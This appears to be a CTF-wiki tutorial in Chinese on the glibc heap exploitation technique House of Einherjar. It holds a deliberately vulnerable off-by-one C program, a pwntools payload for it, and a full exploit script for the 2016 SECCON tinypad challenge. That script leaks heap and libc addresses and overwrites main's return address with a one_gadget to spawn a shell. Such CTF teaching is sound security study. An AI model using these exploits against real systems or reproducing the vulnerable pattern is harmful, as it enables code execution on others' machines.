#  House Of Einherjar

## 介紹

house of einherjar 是一種堆利用技術，由 `Hiroki Matsukuma` 提出。該堆利用技術可以強制使得 `malloc` 返回一個幾乎任意地址的 chunk 。其主要在於濫用 `free` 中的後向合併操作（合併低地址的chunk），從而使得儘可能避免碎片化。

此外，需要注意的是，在一些特殊大小的堆塊中，off by one 不僅可以修改下一個堆塊的 prev_size，還可以修改下一個堆塊的 PREV_INUSE 比特位。

## 原理

### 後向合併操作

`free` 函數中的後向合併核心操作如下

```c
        /* consolidate backward */
        if (!prev_inuse(p)) {
            prevsize = prev_size(p);
            size += prevsize;
            p = chunk_at_offset(p, -((long) prevsize));
            unlink(av, p, bck, fwd);
        }
```

這裏借用原作者的一張圖片說明

![](./figure/backward_consolidate.png)

關於整體的操作，請參考 `深入理解堆的實現` 那一章節。

### 利用原理

這裏我們就介紹該利用的原理。首先，在之前的堆的介紹中，我們可以知道以下的知識

- 兩個物理相鄰的 chunk 會共享 `prev_size`字段，尤其是當低地址的 chunk 處於使用狀態時，高地址的chunk的該字段便可以被低地址的 chunk 使用。因此，我們有希望可以通過寫低地址 chunk 覆蓋高地址 chunk 的 `prev_size` 字段。
- 一個 chunk PREV_INUSE 位標記了其物理相鄰的低地址 chunk 的使用狀態，而且該位是和 prev_size 物理相鄰的。
- 後向合併時，新的 chunk 的位置取決於 `chunk_at_offset(p, -((long) prevsize))` 。

**那麼如果我們可以同時控制一個chunk prev_size 與 PREV_INUSE 字段，那麼我們就可以將新的 chunk 指向幾乎任何位置。**

### 利用過程

#### 溢出前

假設溢出前的狀態如下

![](./figure/einherjar_before_overflow.png)

#### 溢出

這裏我們假設 p0 堆塊一方面可以寫prev_size字段，另一方面，存在off by one的漏洞，可以寫下一個 chunk 的PREV_INUSE 部分，那麼

![](./figure/einherjar_overflowing.png)

#### 溢出後

**假設我們將 p1的 prev_size 字段設置爲我們想要的目的 chunk 位置與p1的差值**。在溢出後，我們釋放p1，則我們所得到的新的 chunk 的位置 `chunk_at_offset(p1, -((long) prevsize))` 就是我們想要的 chunk 位置了。

當然，需要注意的是，由於這裏會對新的 chunk 進行 unlink ，因此需要確保在對應 chunk 位置構造好了fake chunk 以便於繞過 unlink 的檢測。

![](./figure/einherjar_after_overflow.png)

### 攻擊過程示例

可以進行 House Of Einherjar 攻擊的代碼：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void){
    char* s0 = malloc(0x200);　//構造fake chunk
    char* s1 = malloc(0x18);
    char* s2 = malloc(0xf0);　
    char* s3 = malloc(0x20); //爲了不讓s2與top chunk 合併
    printf("begin\n");
    printf("%p\n", s0);
    printf("input s0\n");
    read(0, s0, 0x200); //讀入fake chunk
    printf("input s1\n");
    read(0, s1, 0x19); //Off By One
    free(s2);
    return 0;
}
```

攻擊代碼如下：

```python
from pwn import *

p = process("./example")
context.log_level = 'debug'
#gdb.attach(p)
p.recvuntil("begin\n")
address = int(p.recvline().strip(), 16)
p.recvuntil("input s0\n")
payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
'''
p64(address) * 2是爲了繞過
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr ("corrupted double-linked list");
'''
payload += p64(0x100) #fake size
p.sendline(payload)
p.recvuntil("input s1\n")
payload = "A"*0x10 + p64(0x220) + "\x00"
p.sendline(payload)
p.recvall()
p.close()
```

**注意這裏繞過unlink檢查的方法跟之前利用unlink漏洞時採用的方法不一樣**

利用unlink漏洞的時候：

```c
 p->fd = &p-3*4
 p->bk = &p-2*4
```

在這裏利用時，因爲沒有辦法找到 `&p`  ,所以直接讓：

```c
p->fd = p
p->bk = p
```

**這裏需要注意一個點：**

```python
payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
```

其實修改爲下面這樣也是可以的:

```python
payload = p64(0) + p64(0x221) + p64(address) * 2 + "A"*0xe0
```

按照道理來講 fake chunk 的 size 是 `0x221`  才合理，但是爲什麼  `0x101` 也可以呢？這是因爲對 size 和 prev_size 的驗證只發生在 unlink 裏面，而 unlink 裏面是這樣驗證的:

```c
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");
```

所以只需要再僞造 fake chunk 的 next chunk 的 prev_size 字段就好了。

### 總結

這裏我們總結下這個利用技術需要注意的地方

- 需要有溢出漏洞可以寫物理相鄰的高地址的 prev_size 與 PREV_INUSE 部分。
- 我們需要計算目的 chunk 與 p1 地址之間的差，所以需要泄漏地址。
- 我們需要在目的 chunk 附近構造相應的 fake chunk，從而繞過 unlink 的檢測。


其實，該技術與 chunk extend/shrink 技術比較類似。


## 2016 Seccon tinypad
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad)

### 基本功能分析

首先，可以看出，程序以來一個核心的讀取函數，即讀取指定長度字節的字符串，然而，當讀取的長度恰好爲指定的長度時，會出現 **off by one 的漏洞**。

通過分析程序，我們不難看出，這個程序的基本功能是操作一個 tinypad，主要有以下操作

- 開頭，程序每次開頭依次判斷每個 memo 的指針來判斷是否爲空，如果不爲空，進而利用 strlen 求得其相應的長度，將 memo 的內容輸出。從這裏，我們也可以看出最多有 4 個 memo。
- 添加 memo，遍歷存儲 memo 的變量tinypad，根據 tinypad 的存儲的大小判斷 memo 是否在使用，然後還有的話，分配一個 memo。從這裏我們可以知道，程序只是從 tinypad 起始偏移16*16=256 處纔開始使用，每個 memo 存儲兩個字段，一個是該 memo 的大小，另一個是該 memo 對應的指針。所以我們可以創建一個新的結構體，並修改 ida 識別的 tinypad，使之更加可讀（但是其實 ida 沒有辦法幫忙智能識別。）。同時，由於該添加功能依賴於讀取函數，所以存在 off by one 的漏洞。此外，我們可以看出，用戶申請的 chunk 的大小最大爲 256 字節，和 tinypad 前面的未使用的 256 字節恰好一致。
- 刪除，根據存儲 memo 的大小判斷 memo 是否在被使用，同時將相應 memo 大小設置爲0，但是並沒有將指針設置爲 NULL，有可能會導致 Use After Free。**即在程序開頭時，就有可能輸出一些相關的內容，這其實就是我們泄漏一些基地址的基礎**。
- 編輯。在編輯時，程序首先根據之前存儲的 memo 的內容將其拷貝到 tinypad 的前 256 個字節中，但正如我們之前所說的，當 memo 存儲了 256 個字節時，就會存在 off by one漏洞。與此同時，程序利用 strlen 判斷複製之後的 tinypad 的內容長度，並將其輸出。之後程序繼續利用 strlen 求得 memo 的長度，並讀取指定長度內容到 tinypad 中，根據讀取函數，這裏必然出現了 `\x00`。最後程序將讀取到 tinypad 前 256 字節的內容放到對應 memo 中。
- 退出

### 利用

基本利用思路如下

1. 利用刪除時沒有將指針置爲NULL的 UAF 漏洞，泄漏堆的基地址
2. 再次利用 UAF 漏洞泄漏 libc 的基地址。
3. 利用 house of einherjar 方法在 tinypad 的前 256 字節中僞造 chunk。當我們再次申請時，那麼就可以控制4個 memo 的指針和內容了。
4. 這裏雖然我們的第一想法可能是直接覆蓋 malloc_hook 爲 one_gadget 地址，但是，由於當編輯時，程序是利用 strlen 來判讀可以讀取多少長度，而 malloc_hook 則在初始時爲 0。所以我們直接覆蓋，所以這裏採用其他方法，即修改程序的 main 函數的返回地址爲 one_gadget，之所以可以行得通，是因爲返回地址往往是 7f 開頭的，長度足夠長，可以覆蓋爲one_gadget。所以我們還是需要泄漏 main 函數的返回地址，由於 libc 中存儲了 main 函數 environ 指針的地址，所以我們可以先泄露出environ 的地址，然後在得知存儲 main 函數的返回地址的地址。這裏選取 environ 符號是因爲 environ 符號在 libc 中會導出，而像 argc 和 argv 則不會導出，相對來說會比較麻煩一點。
5. 最後修改 main 函數的返回地址爲 one_gadget 地址獲取shell。

具體利用腳本如下

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
tinypad = ELF("./tinypad")
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
    libc = ELF('./libc.so.6')
else:
    p = process("./tinypad")
    libc = ELF('./libc.so.6')
    main_arena_offset = 0x3c4b20
log.info('PID: ' + str(proc.pidof(p)[0]))


def add(size, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('a')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)


def edit(idx, content):
    p.recvuntil('(CMD)>>> ')
    p.sendline('e')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))
    p.recvuntil('(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil('Is it OK?\n')
    p.sendline('Y')


def delete(idx):
    p.recvuntil('(CMD)>>> ')
    p.sendline('d')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(idx))


def run():
    p.recvuntil(
        '  ============================================================================\n\n'
    )
    # 1. leak heap base
    add(0x70, 'a' * 8)  # idx 0
    add(0x70, 'b' * 8)  # idx 1
    add(0x100, 'c' * 8)  # idx 2

    delete(2)  # delete idx 1
    delete(1)  # delete idx 0, idx 0 point to idx 1
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)  # get pointer point to idx1
    heap_base = u64(data.ljust(8, '\x00')) - 0x80
    log.success('get heap base: ' + hex(heap_base))

    # 2. leak libc base
    # this will trigger malloc_consolidate
    # first idx0 will go to unsorted bin
    # second idx1 will merge with idx0(unlink), and point to idx0
    # third idx1 will merge into top chunk
    # but cause unlink feture, the idx0's fd and bk won't change
    # so idx0 will leak the unsorted bin addr
    delete(3)
    p.recvuntil(' # CONTENT: ')
    data = p.recvuntil('\n', drop=True)
    unsorted_offset_arena = 8 + 10 * 8
    main_arena = u64(data.ljust(8, '\x00')) - unsorted_offset_arena
    libc_base = main_arena - main_arena_offset
    log.success('main arena addr: ' + hex(main_arena))
    log.success('libc base addr: ' + hex(libc_base))

    # 3. house of einherjar
    add(0x18, 'a' * 0x18)  # idx 0
    # we would like trigger house of einherjar at idx 1
    add(0x100, 'b' * 0xf8 + '\x11')  # idx 1
    add(0x100, 'c' * 0xf8)  # idx 2
    add(0x100, 'd' * 0xf8)  #idx 3

    # create a fake chunk in tinypad's 0x100 buffer, offset 0x20
    tinypad_addr = 0x602040
    fakechunk_addr = tinypad_addr + 0x20
    fakechunk_size = 0x101
    fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(
        fakechunk_addr)
    edit(3, 'd' * 0x20 + fakechunk)

    # overwrite idx 1's prev_size and
    # set minaddr of size to '\x00'
    # idx 0's chunk size is 0x20
    diff = heap_base + 0x20 - fakechunk_addr
    log.info('diff between idx1 and fakechunk: ' + hex(diff))
    # '\0' padding caused by strcpy
    diff_strip = p64(diff).strip('\0')
    number_of_zeros = len(p64(diff)) - len(diff_strip)
    for i in range(number_of_zeros + 1):
        data = diff_strip.rjust(0x18 - i, 'f')
        edit(1, data)
    delete(2)
    p.recvuntil('\nDeleted.')

    # fix the fake chunk size, fd and bk
    # fd and bk must be unsorted bin
    edit(4, 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) +
         p64(main_arena + 88))

    # 3. overwrite malloc_hook with one_gadget

    one_gadget_addr = libc_base + 0x45216
    environ_pointer = libc_base + libc.symbols['__environ']
    log.info('one gadget addr: ' + hex(one_gadget_addr))
    log.info('environ pointer addr: ' + hex(environ_pointer))
    #fake_malloc_chunk = main_arena - 60 + 9
    # set memo[0].size = 'a'*8,
    # set memo[0].content point to environ to leak environ addr
    fake_pad = 'f' * (0x100 - 0x20 - 0x10) + 'a' * 8 + p64(
        environ_pointer) + 'a' * 8 + p64(0x602148)
    # get a fake chunk
    add(0x100 - 8, fake_pad)  # idx 2
    #gdb.attach(p)

    # get environ addr
    p.recvuntil(' # CONTENT: ')
    environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00')
    environ_addr = u64(environ_addr)
    main_ret_addr = environ_addr - 30 * 8

    # set memo[0].content point to main_ret_addr
    edit(2, p64(main_ret_addr))
    # overwrite main_ret_addr with one_gadget addr
    edit(1, p64(one_gadget_addr))
    p.interactive()


if __name__ == "__main__":
    run()
```



## 參考文獻

- https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
- https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf
- https://bbs.pediy.com/thread-226119.htm
